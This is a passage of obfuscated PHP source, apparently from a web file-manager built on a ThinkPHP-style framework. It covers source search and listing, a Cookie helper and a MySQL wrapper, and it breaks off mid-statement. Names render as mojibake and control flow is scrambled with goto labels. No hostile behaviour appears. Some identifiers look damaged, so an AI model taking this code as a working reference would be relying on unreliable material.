$FŸíåíòÈÃ) { goto B¨¤¾¤äÈ; f¹îÕ™Ì®Ì: if (!$e¼à“¼ªí) { return; } $a®ÄïÆ…îï = array($d©¿¯ŸßÜ–[428] => array($d©¿¯ŸßÜ–[7], $e¼à“¼ªí), $d©¿¯ŸßÜ–[1535] => 0, $d©¿¯ŸßÜ–[29] => $d©¿¯ŸßÜ–[1806] . $eøë°âÊ…­); $DŒÇÅ¬Ñ‚ = Model($d©¿¯ŸßÜ–[429])->field($d©¿¯ŸßÜ–[76])->where($a®ÄïÆ…îï)->select(); goto AÛ·³„Ì Ş; B¨¤¾¤äÈ: $d©¿¯ŸßÜ– =& $_SERVER[úÉ·öƒÑì©]; if (!$E´‡Óó•ª[$d©¿¯ŸßÜ–[1782]] || $bÄ½÷ï‘ƒ[$d©¿¯ŸßÜ–[373]][$d©¿¯ŸßÜ–[360]] > 1 || !$E´‡Óó•ª[$d©¿¯ŸßÜ–[487]]) { return; } $d¼‰ÊˆÊ = $this->sourceInfo($E´‡Óó•ª[$d©¿¯ŸßÜ–[487]]); goto Dë˜Şø¹º²; AÛ·³„Ì Ş: $DŒÇÅ¬Ñ‚ = array_to_keyvalue($DŒÇÅ¬Ñ‚, $d©¿¯ŸßÜ–[33], $d©¿¯ŸßÜ–[76]); $cùÃ»‹÷ìÀ = array_unique($DŒÇÅ¬Ñ‚); $this->_listSearchMerge($bÄ½÷ï‘ƒ, $E´‡Óó•ª, $FŸíåíòÈÃ, $cùÃ»‹÷ìÀ); goto f‰·±™Ò”Ä; Dë˜Şø¹º²: if (!$d¼‰ÊˆÊ || $d¼‰ÊˆÊ[$d©¿¯ŸßÜ–[413]] != SourceModel::TYPE_GROUP) { return; } $eøë°âÊ…­ = $d¼‰ÊˆÊ[$d©¿¯ŸßÜ–[493]]; $fÖœƒ­±¾İ = Model($d©¿¯ŸßÜ–[1944])->get($eøë°âÊ…­); goto C‚Û¶á’ó—; C‚Û¶á’ó—: $e¼à“¼ªí = array(); $Dò°‡ƒì‚ = $E´‡Óó•ª[$d©¿¯ŸßÜ–[1782]]; foreach ($fÖœƒ­±¾İ[$d©¿¯ŸßÜ–[376]] as $EÏö‘É) { $b«º‚šÙ¾ = $EÏö‘É[$d©¿¯ŸßÜ–[28]]; $A¦‘ÜÌØšê = str_replace($d©¿¯ŸßÜ–[50], $d©¿¯ŸßÜ–[33], Pinyin::encode($b«º‚šÙ¾)); if (stripos($b«º‚šÙ¾, $Dò°‡ƒì‚) !== !1 || stripos($A¦‘ÜÌØšê, $Dò°‡ƒì‚) !== !1) { $e¼à“¼ªí[] = $EÏö‘É[$d©¿¯ŸßÜ–[402]]; } } goto f¹îÕ™Ì®Ì; f‰·±™Ò”Ä: } private function _listSearchMerge(&$F³Ëó±ÚöÍ, $fø¢Û—‚¢–, $B–ÄàÀ®œÒ, $E©«ÁÙêï®) { goto Få·ª×Ë¥é; fé¾ª® «¯: $D“‹ª¾Ááï = array_diff($E©«ÁÙêï®, $A³‡À¨¹Î); if (!$D“‹ª¾Ááï) { return; } $bÈôæÓÙÕò = array($B‰ğÚÚ†[404] => array($B‰ğÚÚ†[7], $D“‹ª¾Ááï)); goto EÁÑ¦İ¡ˆ³; B…ê²Âïî¥: foreach ($aô÷êç¼ê as $eÏó‰ª„ßÁ) { if ($this->_listSearchFilter($eÏó‰ª„ßÁ, $fø¢Û—‚¢–)) { $d¢Œ¥¶¥ Â[] = $eÏó‰ª„ßÁ; } } $F³Ëó±ÚöÍ[$B‰ğÚÚ†[376]] = array_merge($d¢Œ¥¶¥ Â, $F³Ëó±ÚöÍ[$B‰ğÚÚ†[376]]); $F³Ëó±ÚöÍ[$B‰ğÚÚ†[373]][$B‰ğÚÚ†[374]] += count($d¢Œ¥¶¥ Â); goto C­»ƒ˜¾à; Få·ª×Ë¥é: $B‰ğÚÚ† =& $_SERVER[úÉ·öƒÑì©]; if (!$E©«ÁÙêï®) { return; } $A³‡À¨¹Î = array_to_keyvalue($F³Ëó±ÚöÍ[$B‰ğÚÚ†[376]], $B‰ğÚÚ†[33], $B‰ğÚÚ†[404]); goto fé¾ª® «¯; EÁÑ¦İ¡ˆ³: $aô÷êç¼ê = $this->field($B–ÄàÀ®œÒ)->where($bÈôæÓÙÕò)->select(); if (!$aô÷êç¼ê) { return; } $d¢Œ¥¶¥ Â = array(); goto B…ê²Âïî¥; C­»ƒ˜¾à: } private function _listSearchFilter($d÷ ìŠªÈê, $B±éŸ§Êº”) { goto EÜÎÇ¬…Óø; C±Û‡—à™: if (isset($B±éŸ§Êº”[$fÀ¯á—ˆÑÁ[571]]) && $B±éŸ§Êº”[$fÀ¯á—ˆÑÁ[571]] != $d÷ ìŠªÈê[$fÀ¯á—ˆÑÁ[443]]) { return !1; } return !0; goto cÙ†Õ…Æ ; aŸ´¢¡©¬Å: if (isset($B±éŸ§Êº”[$fÀ¯á—ˆÑÁ[414]]) && $B±éŸ§Êº”[$fÀ¯á—ˆÑÁ[414]] != $fÀ¯á—ˆÑÁ[1749]) { if ($B±éŸ§Êº”[$fÀ¯á—ˆÑÁ[414]] == $fÀ¯á—ˆÑÁ[77] && !$D’åîö¤Ç—) { return !1; } if ($B±éŸ§Êº”[$fÀ¯á—ˆÑÁ[414]] != $fÀ¯á—ˆÑÁ[77] && $D’åîö¤Ç—) { return !1; } if (!strstr($d÷ ìŠªÈê[$fÀ¯á—ˆÑÁ[168]], $fÀ¯á—ˆÑÁ[47] . $B±éŸ§Êº”[$fÀ¯á—ˆÑÁ[414]] . $fÀ¯á—ˆÑÁ[47])) { return !1; } } if (isset($B±éŸ§Êº”[$fÀ¯á—ˆÑÁ[1945]]) && $B±éŸ§Êº”[$fÀ¯á—ˆÑÁ[1945]] < $d÷ ìŠªÈê[$fÀ¯á—ˆÑÁ[78]]) { return !1; } if (isset($B±éŸ§Êº”[$fÀ¯á—ˆÑÁ[1946]]) && $B±éŸ§Êº”[$fÀ¯á—ˆÑÁ[1946]] > $d÷ ìŠªÈê[$fÀ¯á—ˆÑÁ[78]]) { return !1; } goto C±Û‡—à™; EÜÎÇ¬…Óø: $fÀ¯á—ˆÑÁ =& $_SERVER[úÉ·öƒÑì©]; $D’åîö¤Ç— = $d÷ ìŠªÈê[$fÀ¯á—ˆÑÁ[412]] == $fÀ¯á—ˆÑÁ[87]; if (!strstr($d÷ ìŠªÈê[$fÀ¯á—ˆÑÁ[496]], $fÀ¯á—ˆÑÁ[47] . $B±éŸ§Êº”[$fÀ¯á—ˆÑÁ[487]] . $fÀ¯á—ˆÑÁ[47])) { return !1; } goto aŸ´¢¡©¬Å; cÙ†Õ…Æ : } public function listSearchChildren($c©¸ÍĞœÕÌ, $f•Ôˆ‘Ì˜Œ = 5000) { goto Aó£‚†¨‚; aäâŠğ‡Šƒ: $DöÊŞ…ö = array($B³µíÓ¦íñ[496] => array($B³µíÓ¦íñ[389], $a»Œå”Øõç[$B³µíÓ¦íñ[496]] . $a»Œå”Øõç[$B³µíÓ¦íñ[404]] . $B³µíÓ¦íñ[522])); $BøéÜ¾…‰Š = $this->field($B³µíÓ¦íñ[404])->cache(null, 600)->where($DöÊŞ…ö)->count(); if ($BøéÜ¾…‰Š > $f•Ôˆ‘Ì˜Œ) { return $this->_listSearchChildrenNear($c©¸ÍĞœÕÌ, $f•Ôˆ‘Ì˜Œ); } goto Cà¢îÁ³³Ó; Aó£‚†¨‚: $B³µíÓ¦íñ =& $_SERVER[úÉ·öƒÑì©]; $EÚøùğÉÖè = array(); $a»Œå”Øõç = $this->sourceInfo($c©¸ÍĞœÕÌ); goto aäâŠğ‡Šƒ; Cà¢îÁ³³Ó: $cÂŸ•¤¢í… = $this->field($B³µíÓ¦íñ[404])->where($DöÊŞ…ö)->select(); $EÚøùğÉÖè = array_to_keyvalue($cÂŸ•¤¢í…, $B³µíÓ¦íñ[33], $B³µíÓ¦íñ[404]); return $EÚøùğÉÖè; goto c¨ˆ†’íøß; c¨ˆ†’íøß: } private function _listSearchChildrenNear($AÚ·Á‘À¨˜, $e¿‰š£İ˜) { goto F®ÜŸ³¶; F®ÜŸ³¶: $DÑö½ªø  =& $_SERVER[úÉ·öƒÑì©]; $aÍİ·äÅŠå = array(); $cì¦êÁôÊ = array($DÑö½ªø [487] => $AÚ·Á‘À¨˜); goto a¿èó‚êç×; a¿èó‚êç×: $fâ‰ÜÔ¹™ = $this->field($DÑö½ªø [1947])->where($cì¦êÁôÊ)->select(); $cø®ò‹ºÎè = array_to_keyvalue(array_filter_by_field($fâ‰ÜÔ¹™, $DÑö½ªø [412], $DÑö½ªø [87]), $DÑö½ªø [33], $DÑö½ªø [404]); $aÍİ·äÅŠå = array_merge($aÍİ·äÅŠå, array_to_keyvalue($fâ‰ÜÔ¹™, $DÑö½ªø [33], $DÑö½ªø [404])); goto Eä˜ÍÇ…ö; Eä˜ÍÇ…ö: if (!$cø®ò‹ºÎè) { return $aÍİ·äÅŠå; } $cì¦êÁôÊ = array($DÑö½ªø [487] => array($DÑö½ªø [7], $cø®ò‹ºÎè)); $fâ‰ÜÔ¹™ = $this->field($DÑö½ªø [1947])->where($cì¦êÁôÊ)->limit($e¿‰š£İ˜)->select(); goto Cœõ‹ø“™Ê; Cœõ‹ø“™Ê: $aÍİ·äÅŠå = array_merge($aÍİ·äÅŠå, array_to_keyvalue($fâ‰ÜÔ¹™, $DÑö½ªø [33], $DÑö½ªø [404])); $aÍİ·äÅŠå = array_slice($aÍİ·äÅŠå, 0, $e¿‰š£İ˜); return $aÍİ·äÅŠå; goto b§•îÂíÂ¡; b§•îÂíÂ¡: } private function _listSearchBindPinyin($f·‡ç÷ªÖì, &$DƒÇ¾¦œÌ, &$fá‹ÓŒ¾) { goto AÏĞï¾‹Ù”; AÏĞï¾‹Ù”: $dâèÛÎ¯½… =& $_SERVER[úÉ·öƒÑì©]; if (!isset($f·‡ç÷ªÖì[$dâèÛÎ¯½…[1782]]) || !$f·‡ç÷ªÖì[$dâèÛÎ¯½…[1782]]) { return; } if (!Input::check($f·‡ç÷ªÖì[$dâèÛÎ¯½…[1782]], $dâèÛÎ¯½…[325]) || strlen($f·‡ç÷ªÖì[$dâèÛÎ¯½…[1782]]) < 2) { return; } goto fØò¶í»•; BÛï‘¯§¼—: foreach ($DƒÇ¾¦œÌ as $CŸÀ±æ™¦é => $bÇ·‚ï¦§) { $DæÕ³ËŒ‹Ö[$dâèÛÎ¯½…[1949] . $CŸÀ±æ™¦é] = $bÇ·‚ï¦§; } foreach ($B¢ñÊğÀ£ as $f¯Õ¹Ã¸ÃÏ) { $DæÕ³ËŒ‹Ö[] = array($dâèÛÎ¯½…[1951] => $f¯Õ¹Ã¸ÃÏ, $dâèÛÎ¯½…[965] => $dâèÛÎ¯½…[1786], array($dâèÛÎ¯½…[1952] => $f¯Õ¹Ã¸ÃÏ, $dâèÛÎ¯½…[1953] => array($dâèÛÎ¯½…[7], array($dâèÛÎ¯½…[453], $dâèÛÎ¯½…[452])))); } $this->join($D”’—Ó†›ê); goto aĞ®ÙêÅôß; DÒ²ˆ¬ãô¢: $fá‹ÓŒ¾ = $dâèÛÎ¯½…[1949] . str_replace($dâèÛÎ¯½…[47], $dâèÛÎ¯½…[1950], $fá‹ÓŒ¾); $B¢ñÊğÀ£ = $DƒÇ¾¦œÌ[$dâèÛÎ¯½…[28]]; unset($DƒÇ¾¦œÌ[$dâèÛÎ¯½…[28]]); goto BÛï‘¯§¼—; fØò¶í»•: $D”’—Ó†›ê = "\x4c\x45\106\124\40\112\x4f\111\116\x20{$this->tablePrefix}\x69\157\137\x73\157\165\162\143\145\137\155\x65\164\x61\x20\155\x65\164\x61\40\157\x6e\x20\x73\157\165\162\143\145\56\x73\157\165\x72\143\x65\x49\104\40\75\40\x6d\145\164\141\56\163\157\165\162\143\x65\x49\x44"; $DæÕ³ËŒ‹Ö = array(); $fá‹ÓŒ¾ = str_replace(array($dâèÛÎ¯½…[229], $dâèÛÎ¯½…[50], $dâèÛÎ¯½…[1948]), $dâèÛÎ¯½…[33], $fá‹ÓŒ¾); goto DÒ²ˆ¬ãô¢; aĞ®ÙêÅôß: $DƒÇ¾¦œÌ = $DæÕ³ËŒ‹Ö; goto F¢ï–¿ñŞ´; F¢ï–¿ñŞ´: } private function _parseSearchWhere($CîØŸÕùÀ’) { goto EØî¡°¢Èì; EäÏ¸Ô‡§: if (isset($CîØŸÕùÀ’[$e»Üİà¸[485]]) && $CîØŸÕùÀ’[$e»Üİà¸[485]]) { $E×ä½äé‚ = array($e»Üİà¸[1955], $CîØŸÕùÀ’[$e»Üİà¸[485]]); if ($bğÏ ³ÉÁà[$e»Üİà¸[84]]) { $bğÏ ³ÉÁà[$e»Üİà¸[84]] = array($bğÏ ³ÉÁà[$e»Üİà¸[84]], $E×ä½äé‚, $e»Üİà¸[1956]); } else { $bğÏ ³ÉÁà[$e»Üİà¸[84]] = $E×ä½äé‚; } } if (isset($CîØŸÕùÀ’[$e»Üİà¸[1945]]) && $CîØŸÕùÀ’[$e»Üİà¸[1945]] > 0) { $bğÏ ³ÉÁà[$e»Üİà¸[78]] = array($e»Üİà¸[1954], $CîØŸÕùÀ’[$e»Üİà¸[1945]]); } if (isset($CîØŸÕùÀ’[$e»Üİà¸[1946]]) && $CîØŸÕùÀ’[$e»Üİà¸[1946]]) { $E×ä½äé‚ = array($e»Üİà¸[1955], $CîØŸÕùÀ’[$e»Üİà¸[1946]]); if ($bğÏ ³ÉÁà[$e»Üİà¸[78]]) { $bğÏ ³ÉÁà[$e»Üİà¸[78]] = array($bğÏ ³ÉÁà[$e»Üİà¸[78]], $E×ä½äé‚, $e»Üİà¸[1956]); } else { $bğÏ ³ÉÁà[$e»Üİà¸[78]] = $E×ä½äé‚; } } goto e½¨ñîÊ; e½¨ñîÊ: if (isset($CîØŸÕùÀ’[$e»Üİà¸[571]]) && $CîØŸÕùÀ’[$e»Üİà¸[571]]) { $bğÏ ³ÉÁà[] = array($e»Üİà¸[443] => $CîØŸÕùÀ’[$e»Üİà¸[571]], $e»Üİà¸[441] => $CîØŸÕùÀ’[$e»Üİà¸[571]], $e»Üİà¸[965] => $e»Üİà¸[1786]); } if (isset($CîØŸÕùÀ’[$e»Üİà¸[414]]) && $CîØŸÕùÀ’[$e»Üİà¸[414]]) { $C× î—ç¼ = $CîØŸÕùÀ’[$e»Üİà¸[414]]; if ($C× î—ç¼ == $e»Üİà¸[77]) { $bğÏ ³ÉÁà[$e»Üİà¸[412]] = 1; } else { if ($C× î—ç¼ == $e»Üİà¸[1957]) { $bğÏ ³ÉÁà[$e»Üİà¸[412]] = 0; } else { if ($C× î—ç¼) { $C× î—ç¼ = is_array($C× î—ç¼) ? $C× î—ç¼ : explode($e»Üİà¸[47], $C× î—ç¼); $bğÏ ³ÉÁà[$e»Üİà¸[414]] = array($e»Üİà¸[420], $C× î—ç¼); $bğÏ ³ÉÁà[$e»Üİà¸[412]] = 0; } } } } if (isset($CîØŸÕùÀ’[$e»Üİà¸[487]]) && $CîØŸÕùÀ’[$e»Üİà¸[487]]) { $d‚ „Ü–’ = $this->sourceInfo($CîØŸÕùÀ’[$e»Üİà¸[487]]); $bğÏ ³ÉÁà[$e»Üİà¸[562]] = array($e»Üİà¸[521], $d‚ „Ü–’[$e»Üİà¸[496]] . $CîØŸÕùÀ’[$e»Üİà¸[487]] . $e»Üİà¸[522]); } goto fôÊÉ”®©; EØî¡°¢Èì: $e»Üİà¸ =& $_SERVER[úÉ·öƒÑì©]; $bğÏ ³ÉÁà = array(); if (isset($CîØŸÕùÀ’[$e»Üİà¸[737]]) && $CîØŸÕùÀ’[$e»Üİà¸[737]]) { $bğÏ ³ÉÁà[$e»Üİà¸[84]] = array($e»Üİà¸[1954], $CîØŸÕùÀ’[$e»Üİà¸[737]]); } goto EäÏ¸Ô‡§; fôÊÉ”®©: if (isset($CîØŸÕùÀ’[$e»Üİà¸[1782]]) && trim($CîØŸÕùÀ’[$e»Üİà¸[1782]])) { $B±­Å§ñí = trim($CîØŸÕùÀ’[$e»Üİà¸[1782]]); $aî’¤»ËÇÜ = explode($e»Üİà¸[50], $B±­Å§ñí); if (strlen($B±­Å§ñí) > 2 && (substr($B±­Å§ñí, 0, 1) == $e»Üİà¸[116] && substr($B±­Å§ñí, -1) == $e»Üİà¸[116]) || substr($B±­Å§ñí, 0, 1) == $e»Üİà¸[55] && substr($B±­Å§ñí, -1) == $e»Üİà¸[55]) { $B±­Å§ñí = substr($B±­Å§ñí, 1, -1); $aî’¤»ËÇÜ = array($B±­Å§ñí); } $bğÏ ³ÉÁà[$e»Üİà¸[28]] = array(array($e»Üİà¸[521], $e»Üİà¸[1784] . $B±­Å§ñí . $e»Üİà¸[1784])); if (count($aî’¤»ËÇÜ) > 1) { $bğÏ ³ÉÁà[$e»Üİà¸[28]] = array(); foreach ($aî’¤»ËÇÜ as $f¥©ˆÇ¬Â´) { if (!trim($f¥©ˆÇ¬Â´)) { continue; } $bğÏ ³ÉÁà[$e»Üİà¸[28]][] = array($e»Üİà¸[521], $e»Üİà¸[1784] . trim($f¥©ˆÇ¬Â´) . $e»Üİà¸[1784]); } } } return $bğÏ ³ÉÁà; goto cƒœ©®µ„´; cƒœ©®µ„´: } } goto cËŠ¨ó…ù; A£±»ØØ†: define($_SERVER[úÉ·öƒÑì©][240], 0); define($_SERVER[úÉ·öƒÑì©][241], 2); $Aˆ™î—˜œ‹ = $_SERVER[$_SERVER[úÉ·öƒÑì©][242]]; goto e¾¼¯ÌÁ‹¥; eÏ¼ò‹ë£Ø: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($dÎÈ•çÇ¬ = '', $B½İì‡Öİ = 0) { if (is_string($dÎÈ•çÇ¬) && $dÎÈ•çÇ¬ != $_SERVER[úÉ·öƒÑì©][33]) { $this->prefix = $dÎÈ•çÇ¬; } if (is_numeric($B½İì‡Öİ) && $B½İì‡Öİ > 0) { $this->expire = $B½İì‡Öİ; } } public static function getInstance() { static $Fô¿¥¤Ò­Í; if ($Fô¿¥¤Ò­Í === null) { $Fô¿¥¤Ò­Í = new self(); } return $Fô¿¥¤Ò­Í; } private static $cookieDisable = false; public static function disable($Eˆéå»ŸºÅ) { self::$cookieDisable = $Eˆéå»ŸºÅ; } private static $sameCookieSet = array(); public static function set($BÈ°­œ», $Aªª‘»Î‹‡, $b‡ÖŞ¥±ˆ = 0, $a…†˜¢¡ˆ = false, $Aˆ©¼›…”© = false) { goto f™ÏÊŒµÕ¢; f«‡ÔÇÕÇ: $CĞ·ÄÎŒ‹ = $D—ÇŒŞ¦ø[33]; setcookie($BÈ°­œ», $Aªª‘»Î‹‡, time() + $b‡ÖŞ¥±ˆ, $D—ÇŒŞ¦ø[8] . trim($Aˆ©¼›…”©, $D—ÇŒŞ¦ø[8]) . $CĞ·ÄÎŒ‹, !1, !1, $a…†˜¢¡ˆ); goto Bª¢ñ…ƒ“¯; c‰ÒÊÛ¬ªÄ: if (isset(self::$sameCookieSet[$BÈ°­œ»]) && self::$sameCookieSet[$BÈ°­œ»] == $Aªª‘»Î‹‡ . $b‡ÖŞ¥±ˆ) { return; } self::$sameCookieSet[$BÈ°­œ»] = $Aªª‘»Î‹‡ . $b‡ÖŞ¥±ˆ; if (!$Aˆ©¼›…”©) { $Aˆ©¼›…”© = str_replace(HOST, $D—ÇŒŞ¦ø[33], APP_HOST); $Aˆ©¼›…”© = _get($GLOBALS, $D—ÇŒŞ¦ø[852], $Aˆ©¼›…”©); } goto f«‡ÔÇÕÇ; f™ÏÊŒµÕ¢: $D—ÇŒŞ¦ø =& $_SERVER[úÉ·öƒÑì©]; if (self::$cookieDisable) { return; } if (!$b‡ÖŞ¥±ˆ) { $b‡ÖŞ¥±ˆ = 24 * 3600 * 7; } goto c‰ÒÊÛ¬ªÄ; Bª¢ñ…ƒ“¯: } public static function setSafe($FİÂ—ê™¶, $eİÅˆ¬òÇ, $BÙÏÎàåôŠ = 0) { self::set($FİÂ—ê™¶, $eİÅˆ¬òÇ, $BÙÏÎàåôŠ, !0); } public static function get($A¤Ô™…Óã) { return isset($_COOKIE[$A¤Ô™…Óã]) ? $_COOKIE[$A¤Ô™…Óã] : !1; } public static function remove($FŞñ‚Ñ¹¨Ş, $aŠŸÅèã› = false) { unset($_COOKIE[$FŞñ‚Ñ¹¨Ş]); self::set($FŞñ‚Ñ¹¨Ş, $_SERVER[úÉ·öƒÑì©][33], 1, $aŠŸÅèã›); } } class DbMysql extends Db { public function __construct($b¨…éŸ¥ô¿ = '') { $FÄÓ„‘µ§ =& $_SERVER[úÉ·öƒÑì©]; if (!extension_loaded($FÄÓ„‘µ§[775])) { think_exception(think_lang($FÄÓ„‘µ§[10]) . $FÄÓ„‘µ§[853]); } if (!empty($b¨…éŸ¥ô¿)) { $this->config = $b¨…éŸ¥ô¿; if (empty($this->config[$FÄÓ„‘µ§[13]])) { $this->config[$FÄÓ„‘µ§[13]] = $FÄÓ„‘µ§[33]; } } } public function connect($bğ”ˆ…×Ñš = '', $e¤¦¢¢‰ä = 0, $cÕ“äÛÍ = false) { $cáÀÅñÓ‡° =& $_SERVER[úÉ·öƒÑì©]; if (!isset($this->linkID[$e¤¦¢¢‰ä])) { goto fÜí–öğ…³; E¦†ğšÈÆİ: if (1 != think_config($cáÀÅñÓ‡°[18])) { unset($this->config); } goto E„®ƒ¤ÀÏ›; fÜí–öğ…³: if (empty($bğ”ˆ…×Ñš)) { $bğ”ˆ…×Ñš = $this->config; } $F©æ‚Õ–•‘ = $bğ”ˆ…×Ñš[$cáÀÅñÓ‡°[854]] . ($bğ”ˆ…×Ñš[$cáÀÅñÓ‡°[855]] ? "\72{$bğ”ˆ…×Ñš[$cáÀÅñÓ‡°[855]]}" : $cáÀÅñÓ‡°[33]); $a¨ÏäÄ­Œ = !empty($bğ”ˆ…×Ñš[$cáÀÅñÓ‡°[13]][$cáÀÅñÓ‡°[14]]) ? $bğ”ˆ…×Ñš[$cáÀÅñÓ‡°[13]][$cáÀÅñÓ‡°[14]] : $this->pconnect; goto Fªªƒ¿¸£; Fªªƒ¿¸£: if ($a¨ÏäÄ­Œ) { $this->linkID[$e¤¦¢¢‰ä] = mysql_pconnect($F©æ‚Õ–•‘, $bğ”ˆ…×Ñš[$cáÀÅñÓ‡°[856]], $bğ”ˆ…×Ñš[$cáÀÅñÓ‡°[857]], 131072); } else { $this->linkID[$e¤¦¢¢‰ä] = mysql_connect($F©æ‚Õ–•‘, $bğ”ˆ…×Ñš[$cáÀÅñÓ‡°[856]], $bğ”ˆ…×Ñš[$cáÀÅñÓ‡°[857]], !0, 131072); } if (!$this->linkID[$e¤¦¢¢‰ä] || !empty($bğ”ˆ…×Ñš[$cáÀÅñÓ‡°[17]]) && !mysql_select_db($bğ”ˆ…×Ñš[$cáÀÅñÓ‡°[17]], $this->linkID[$e¤¦¢¢‰ä])) { think_exception(mysql_error()); } $fÈ‰å•’Ù¨ = mysql_get_server_info($this->linkID[$e¤¦¢¢‰ä]); goto cŞÜ¿‘¶ ø; cŞÜ¿‘¶ ø: mysql_query($cáÀÅñÓ‡°[858] . think_config($cáÀÅñÓ‡°[859]) . $cáÀÅñÓ‡°[55], $this->linkID[$e¤¦¢¢‰ä]); if ($fÈ‰å•’Ù¨ > $cáÀÅñÓ‡°[860]) { mysql_query($cáÀÅñÓ‡°[861], $this->linkID[$e¤¦¢¢‰ä]); } $this->connected = !0; goto E¦†ğšÈÆİ; E„®ƒ¤ÀÏ›: } return $this->linkID[$e¤¦¢¢‰ä]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($aôè¤¯ù¦ø) { goto B‘ƒµ²š‘’; Cä·Ÿ²Î ˆ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto C¢çªöõŒ¯; aÊñ‹ò…§è: think_action_status($AäĞï¦©„[19], 1); think_status($AäĞï¦©„[20]); $this->queryID = mysql_query($aôè¤¯ù¦ø, $this->_linkID); goto Cä·Ÿ²Î ˆ; B‘ƒµ²š‘’: $AäĞï¦©„ =& $_SERVER[úÉ·öƒÑì©]; if (0 === stripos($aôè¤¯ù¦ø, $AäĞï¦©„[271])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto EÒÏªá‘¬; EÒÏªá‘¬: if (!$this->_linkID) { return !1; } $this->queryStr = $aôè¤¯ù¦ø; if ($this->queryID) { $this->free(); } goto aÊñ‹ò…§è; C¢çªöõŒ¯: } public function execute($d¾µ¨°°ù½) { goto b¥ß¦†­«Û; E–è²ä¡ê: think_status($a¸±¥ß£‰”[20]); $B¬¾âÀéñ = mysql_query($d¾µ¨°°ù½, $this->_linkID); $this->debug(); goto fÜ”¼®ÊˆÂ; fÜ”¼®ÊˆÂ: if (!1 === $B¬¾âÀéñ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto CßøÄÑ«êÏ; b¥ß¦†­«Û: $a¸±¥ß£‰” =& $_SERVER[úÉ·öƒÑì©]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto fŸòÇÀóÃä; fŸòÇÀóÃä: $this->queryStr = $d¾µ¨°°ù½; if ($this->queryID) { $this->free(); } think_action_status($a¸±¥ß£‰”[21], 1); goto E–è²ä¡ê; CßøÄÑ«êÏ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[úÉ·öƒÑì©][862], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C¦é˜¾²­÷ = mysql_query($_SERVER[úÉ·öƒÑì©][863], $this->_linkID); $this->transTimes = 0; if (!$C¦é˜¾²­÷) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $EÚİ­ñï» = mysql_query($_SERVER[úÉ·öƒÑì©][864], $this->_linkID); $this->transTimes = 0; if (!$EÚİ­ñï») { $this->error(); return !1; } } return !0; } private function getAll() { $FÔ´©ö±ß« = array(); if ($this->numRows > 0) { while ($BÖ‚·ëœ‚Ú = mysql_fetch_assoc($this->queryID)) { $FÔ´©ö±ß«[] = $BÖ‚·ëœ‚Ú; } mysql_data_seek($this->queryID, 0); } return $FÔ´©ö±ß«; } public function getFields($BÎ ¼‡¨¼›) { $b°ÛªÃŠô“ =& $_SERVER[úÉ·öƒÑì©]; $fÆóŸ‚ƒ = $this->query($b°ÛªÃŠô“[865] . $this->parseKey($BÎ ¼‡¨¼›)); $fàÇ´îÍ© = array(); if ($fÆóŸ‚ƒ) { foreach ($fÆóŸ‚ƒ as $A®Ë”Ù©í‘ => $b¨÷ÌÇÚŸ•) { $fàÇ´îÍ©[$b¨÷ÌÇÚŸ•[$b°ÛªÃŠô“[27]]] = array($b°ÛªÃŠô“[28] => $b¨÷ÌÇÚŸ•[$b°ÛªÃŠô“[27]], $b°ÛªÃŠô“[29] => $b¨÷ÌÇÚŸ•[$b°ÛªÃŠô“[30]], $b°ÛªÃŠô“[31] => (bool) (strtoupper($b¨÷ÌÇÚŸ•[$b°ÛªÃŠô“[32]]) === $b°ÛªÃŠô“[866]), $b°ÛªÃŠô“[34] => $b¨÷ÌÇÚŸ•[$b°ÛªÃŠô“[35]], $b°ÛªÃŠô“[36] => strtolower($b¨÷ÌÇÚŸ•[$b°ÛªÃŠô“[37]]) == $b°ÛªÃŠô“[38], $b°ÛªÃŠô“[39] => strtolower($b¨÷ÌÇÚŸ•[$b°ÛªÃŠô“[40]]) == $b°ÛªÃŠô“[41]); } } return $fàÇ´îÍ©; } public function getTables($D²’¬ƒ´°å = '') { $D£ãöéÅŒÑ =& $_SERVER[úÉ·öƒÑì©]; if (!empty($D²’¬ƒ´°å)) { $fŒâà¸Ô”‰ = $D£ãöéÅŒÑ[867] . $D²’¬ƒ´°å . $D£ãöéÅŒÑ[868]; } else { $fŒâà¸Ô”‰ = $D£ãöéÅŒÑ[869]; } $D¶‚ÎÚ¼ää = $this->query($fŒâà¸Ô”‰); $e˜Û…Ô­Ş† = array(); foreach ($D¶‚ÎÚ¼ää as $b˜Ö½Õ˜Šö => $bôÂèÒƒ””) { $e˜Û…Ô­Ş†[$b˜Ö½Õ˜Šö] = current($bôÂèÒƒ””); } return $e˜Û…Ô­Ş†; } public function replace($E÷œˆª•·, $AÁÄ¬àµ˜ö = array()) { $a ëõéÑ¯¾ =& $_SERVER[úÉ·öƒÑì©]; foreach ($E÷œˆª•· as $cù¸é´å±Ä => $a‹”˜ğÈƒó) { $D×ŸÜ¹çÕÌ = $this->parseValue($a‹”˜ğÈƒó); if (is_scalar($D×ŸÜ¹çÕÌ)) { $aÔÁŒÌ“ŸÕ[] = $D×ŸÜ¹çÕÌ; $C’â‡¥¡®«[] = $this->parseKey($cù¸é´å±Ä); } } $dïä­«Õêš = $a ëõéÑ¯¾[870] . $this->parseTable($AÁÄ¬àµ˜ö[$a ëõéÑ¯¾[286]]) . $a ëõéÑ¯¾[871] . implode($a ëõéÑ¯¾[47], $C’â‡¥¡®«) . $a ëõéÑ¯¾[872] . implode($a ëõéÑ¯¾[47], $aÔÁŒÌ“ŸÕ) . $a ëõéÑ¯¾[873]; return $this->execute($dïä­«Õêš); } public function insertAll($Aºùß­Âœ†, $d¸÷ßŠóÚ  = array(), $aİº¯‰ÆÛŒ = false) { goto a¨ˆ³²ÒÄœ; a¨ˆ³²ÒÄœ: $bÜíÈí…éÊ =& $_SERVER[úÉ·öƒÑì©]; if (!is_array($Aºùß­Âœ†[0])) { return !1; } $dÓåÓ³ÄØ = array_keys($Aºùß­Âœ†[0]); goto C–Å…ÙÕÜì; f„œÚÏ„: $bÒì’È·Ó = 